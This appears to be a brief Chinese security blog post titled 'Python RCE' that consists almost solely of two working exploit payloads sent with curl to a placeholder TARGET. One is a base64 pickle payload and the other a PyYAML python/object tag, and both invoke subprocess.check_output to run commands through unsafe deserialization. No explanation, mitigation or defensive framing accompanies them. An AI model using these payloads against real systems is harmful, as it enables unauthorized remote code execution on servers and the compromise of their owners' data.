#  Python RCE  
原创 Z
                    Z  威胁情报Z分析   2026-10-18 00:12  
  
Pickle  
```
curl TARGET/api -H"Content-Type:application/json" -d'{"data":"gASVKwAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5RdlIwCaWSUYYWUUpQu"}'
```  
  
PyYAML  
```
curl TARGET/api/config -H"Content-Type:application/x-yaml" -d'!!python/object/new:subprocess.check_output [["id"]]'
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0LGiaGIrzXukR9NFLMjxlcZDdMLITAveJRq9vY6EyjOzhLZW3JuhZm0Sa0xiawqkXhGz7W4Fl6ZgcQvXE3lWEicqTebXZ73Rev72WADYuTO6dM/640?wx_fmt=png&from=appmsg "")  
  
  
